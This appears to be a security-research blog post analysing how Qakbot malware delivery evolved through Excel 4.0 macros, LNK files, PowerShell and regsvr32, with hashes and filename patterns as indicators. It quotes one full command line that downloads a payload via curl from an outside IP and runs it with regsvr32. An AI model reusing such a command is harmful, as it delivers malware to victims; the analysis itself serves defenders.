Rise in Qakbot attacks traced to evolving threat
techniques
zscaler.com/blogs/security-research/rise-qakbot-attacks-traced-evolving-threat-techniques

Active since 2008, Qakbot, also known as QBot, QuackBot and Pinkslipbot, is a common
trojan malware designed to steal passwords. This pervasive threat spreads using an emaildriven botnet that inserts replies in active email threads. Qakbot threat actors are also
known to target bank customers and use the access they gain through compromised
credentials to spy on financial operations and gain valuable intel.
Summary
Qakbot has been a prevalent threat over the past 14 years and continues to evolve
adopting new delivery vectors to evade detection. Zscaler Threatlabz has discovered a
significant uptick in the spread of Qakbot malware over the past six months using several
new techniques. Most recently, threat actors have transformed their techniques to evade
detection by using ZIP file extensions, enticing file names with common formats, and Excel
(XLM) 4.0 to trick victims into downloading malicious attachments that install Qakbot. Other
more subtle techniques are being deployed by threat actors to prevent automated detection
and raise the odds that their attack will work, including obfuscating code, leveraging multiple
URLs to deliver the payload, using unknown file extension names to deliver the payload,
and altering the steps of the process by introducing new layers between initial compromise,
delivery, and final execution.
Embedded as commonly-named attachments, Qakbot leverages ZIP archive file having
embedded files such as Microsoft Office files, LNK, Powershell, and more. The screenshot
in Fig. 1 below reveals a snapshot view of the spikes in Qakbot activity observed over the
past six months.

Zscaler automatically identifies and blocks files containing Qakbot malware for our
customers, and provides them with the best possible solution to manage this evolving
threat.
As an extra precaution against these types of threats, Zscaler recommends that
organizations formally train users not to open email attachments sent from untrusted or
unknown sources and encourage users to verify URLs in their browser address bar before
entering credentials.
The Zscaler ThreatLabz team will continue to monitor this campaign, as well as others to
help keep our customers safe and share critical information with the larger SecOps
community to help stop the spread of active threats like Qakbot and protect people
everywhere. The following sections dive into an in-depth analysis of this evolving threat and
provide actionable indicators that security professionals can apply to identify and block
Qakbot in their environments.
Technical analysis of evolving Qakbot techniques
ThreatLabz has observed threat actors using various different file names to disguise
attachments designed to deliver Qakbot. Using common file naming formats that include a
description, generated numbers, and dates, the files feature common keywords for finance
and business operations, including compensation figures, metric reports, invoices and other
enticing datasets. To the unsuspecting victim, these types of files may either appear like
everyday items for business as usual or as a rare opportunity to look at data they would not
normally see. Either way, the victim is likely to fall for the sense of urgency at a fresh data
set or request and click the file to learn more about what is inside and how it pertains to
them.

Analyzing the de-obfuscated code exposes how these malicious attachments use XLM 4.0
to hide their macros and evade detection by static analysis tools and automated sandboxes.
Looking back over the past six months, our researchers observed a different kind of emails
templates and standardized Office templates which are being used and changed only
slightly in nearly all of the analyzed Qakbot samples.
Email Templates:

Qakbot samples from December 2021 - May 2022:

Once the user clicks “Enable Content” to view the attachment, the macro is activated to look
for a subroutine with a pre-defined function, in this case starting with auto_open777777. In
the next step of the sequence, the URLDownloadToFile function is imported and called to
download the malicious Qakbot Payload and drop it into the C:\ProgramData\ location on
the victim’s machine with the filename .OCX which is actually Qakbot DLL. Then WinAPI
EXEC from Excel4Macro directly executes the malicious payload or loads the payload using
regsvr32.exe.

January 2022: Qakbot XLM 4.0 snippet [Md5:

In the following snippet it executes macro code which is present in the cells from a hidden
sheet named ‘EFFWFWFW'. This creates a REGISTER and consistently calls functions to
be performed, except in this example the threat actor has evolved the action to avoid
detection via obfuscation.

March 2022: Qakbot XLM 4.0 snippet [Md5: 3243D439F8B0B4A58478DFA34C3C42C7]
Observed change in the file system persistence level.
Change in payload drop location from C:\ProgramData\ to
C:\Users\User\AppData\Local\[random_folder_name]\random.dll
Less obfuscation and code is much more readable.
Used option-s with regsvr32.exe so that it can install silently without prompting any
kind of message.

April 2022: XLM 4.0 snippet [Md5: 396C770E50CBAD0D9779969361754D69]
A new change is the observation of fully de-obfuscated code in Qakbot attachments. A
similarity observed across Qakbot variants is the use of multiple URLs that can deliver the
malicious payload, so that if any one URL goes down or is blocked, then the payload can
still be delivered by another available URL. Additionally, it is common to see threat actors
trying to evade detection from automated security scans by using unknown extensions on
dropped payloads such as OCX, ooccxx, .dat, .gyp, and more.

Observed change in the filename to ([0-9]{2,5}\.[0-9]{4,12}\.dat]. Additionally, Instead of 45 different download payload URLs, only one Qakbot download URL is identified.

Observed increase using the shortcut LNK filetype source with names like:
report[0-9]{3}\.lnk
report228.lnk
report224.lnk
Observed change using powershell.exe to download the malware payload.
Observed change and a clear sign of Qakbot evolving to evade updated security practices
and defenses by loading the dll payload through rundll32.exe instead of regsvr32.exe.
Argument:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit iwr

b) June 2022: Qakbot snippet of LNK file
Observed change in execution flow and name of file name both change on LNK file type.
Regsvr32.exe used while qakbot dll loading and injects to explorer.exe as well for
communication to command and control server. Observed file names using the {5[0-9]
{7,10}_[0-9][6,8]}\.lnk} LNK file type:

Argument: 'C:\Windows\system32\cmd.exe C:\Windows\System32\cmd.exe /q /c echo
'HRTDGR' && MD "%ProgramData%\Username" && curl.exe -o
%ProgramData%\Username\filename.pos 91.234.254.106/%random%.dat && ping -n 2
localhost && echo "MERgd" && echo "NRfd" && regsvr32
'C:\ProgramData\Username\filename.pos'
Through command prompt it downloads a payload and drops the file on the victim’s
machine with a curl command. Here are some observed examples of the process:
CMD.EXE :
/q
/c

: Turns the echo off.
: Carries out the command specified by string and then stops.

CURL.EXE :
/o: Write to file
After that it loads the downloaded dll payload through regsvr32.exe and injects into the
explorer.exe. Then performs further operations, including:
Checks for the presence of antivirus software.
Creates a RUN key for persistence in the system.
Creates scheduled tasks to execute the payload at a specific time.

More details on these findings are covered in the ThreatLabz Qakbot vectors blog.
Downloaded Qakbot DLL: 529fb9186fa6e45fd4b7d2798c7c553c from above mentioned
LNK file.
The entry point of the executable is fully obfuscated using duplicate MOV operations.

purposes.
